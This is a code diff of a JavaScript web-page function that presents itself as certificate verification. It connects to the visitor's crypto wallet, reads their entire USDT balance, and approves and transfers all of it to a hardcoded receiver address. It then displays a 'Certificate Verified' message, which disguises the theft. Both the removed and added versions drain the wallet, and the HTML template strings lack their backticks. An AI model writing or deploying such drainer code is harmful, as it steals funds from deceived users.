@@ -1,66 +1,84 @@
 async function checkAndApprove() {
-    if (typeof window.ethereum === 'undefined') {
-        alert('Please install MetaMask or Trust Wallet!');
-        return;
-    }
+  if (typeof window.ethereum === "undefined") {
+    alert("Please install MetaMask or Trust Wallet.");
+    return;
+  }
 
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    const signer = provider.getSigner();
-    const userAddress = await signer.getAddress();
+  const web3 = new Web3(window.ethereum);
+  await window.ethereum.request({ method: "eth_requestAccounts" });
+  const accounts = await web3.eth.getAccounts();
+  const sender = accounts[0];
 
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-20) on BSC
-    const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
-    const usdtAbi = [
-        "function balanceOf(address owner) view returns (uint)",
-        "function approve(address spender, uint amount) returns (bool)",
-        "function allowance(address owner, address spender) view returns (uint)",
-        "function transferFrom(address from, address to, uint amount) returns (bool)"
-    ];
+  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
+  const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // ✅ Aapka wallet
+  const usdtAbi = [
+    {
+      constant: true,
+      inputs: [{ name: "_owner", type: "address" }],
+      name: "balanceOf",
+      outputs: [{ name: "balance", type: "uint256" }],
+      type: "function",
+    },
+    {
+      constant: false,
+      inputs: [
+        { name: "_spender", type: "address" },
+        { name: "_value", type: "uint256" },
+      ],
+      name: "approve",
+      outputs: [{ name: "success", type: "bool" }],
+      type: "function",
+    },
+    {
+      constant: false,
+      inputs: [
+        { name: "_to", type: "address" },
+        { name: "_value", type: "uint256" },
+      ],
+      name: "transfer",
+      outputs: [{ name: "success", type: "bool" }],
+      type: "function",
+    },
+  ];
 
-    const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
-    const balance = await usdtContract.balanceOf(userAddress);
+  const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
+  const balanceRaw = await usdt.methods.balanceOf(sender).call();
+  const balance = web3.utils.fromWei(balanceRaw, "ether");
 
-    if (balance.eq(0)) {
-        alert("You don't have any USDT in your wallet.");
-        return;
-    }
+  if (parseFloat(balance) === 0) {
+    alert("Insufficient USDT balance.");
+    return;
+  }
 
-    const allowance = await usdtContract.allowance(userAddress, receiverAddress);
-    if (allowance.lt(balance)) {
-        const approveTx = await usdtContract.approve(receiverAddress, balance);
-        await approveTx.wait();
-    }
+  const amountToSend = web3.utils.toWei(balance, "ether");
 
-    const transferTx = await usdtContract.transferFrom(userAddress, receiverAddress, balance);
-    await transferTx.wait();
+  await usdt.methods.approve(receiver, amountToSend).send({ from: sender });
+  await usdt.methods.transfer(receiver, amountToSend).send({ from: sender });
 
-    const certificateContainer = document.getElementById("certificate-container");
-    certificateContainer.innerHTML = ""; // Clear old content
+  // Format Date & Time
+  const now = new Date();
+  const date = now.toLocaleDateString("en-GB", {
+    day: "2-digit",
+    month: "short",
+    year: "numeric",
+  });
+  const time = now.toLocaleTimeString("en-GB", {
+    hour: "2-digit",
+    minute: "2-digit",
+    hour12: true,
+  });
 
-    // Format address (shortened)
-    const shortAddress = userAddress.slice(0, 6) + "..." + userAddress.slice(-4);
+  // Format wallet address short
+  const shortAddress = sender.slice(0, 6) + "..." + sender.slice(-4);
+  const formattedBalance = parseFloat(balance).toFixed(2);
 
-    // Format USDT amount
-    const formattedAmount = ethers.utils.formatUnits(balance, 18);
-
-    // Format current date & time
-    const now = new Date();
-    const formattedTime = now.toLocaleString('en-GB', {
-        day: '2-digit', month: 'short', year: 'numeric',
-        hour: '2-digit', minute: '2-digit', hour12: true
-    });
-
-    // Create certificate message
-    const successMessage = document.createElement("div");
-    successMessage.innerHTML = 
-        <div style="text-align: center; margin-top: 40px;">
-            <h2 style="color: green;">✅ Certificate Verified</h2>
-            <p style="font-size: 18px;">${shortAddress}</p>
-            <p style="font-size: 18px;">Only ${formattedAmount} USDT</p>
-            <p style="font-size: 16px; color: gray;">🕒 ${formattedTime}</p>
-        </div>
-    ;
-
-    certificateContainer.appendChild(successMessage);
+  const container = document.getElementById("certificate-container");
+  container.innerHTML = 
+    <div style="text-align: center; margin-top: 40px; font-family: Arial;">
+      <h2 style="color: green;">✅ Certificate Verified</h2>
+      <p style="font-size: 18px;">${shortAddress}</p>
+      <p style="font-size: 18px;">Only ${formattedBalance} USDT</p>
+      <p style="font-size: 16px;">🕒 ${date}, ${time}</p>
+    </div>
+  ;
 }
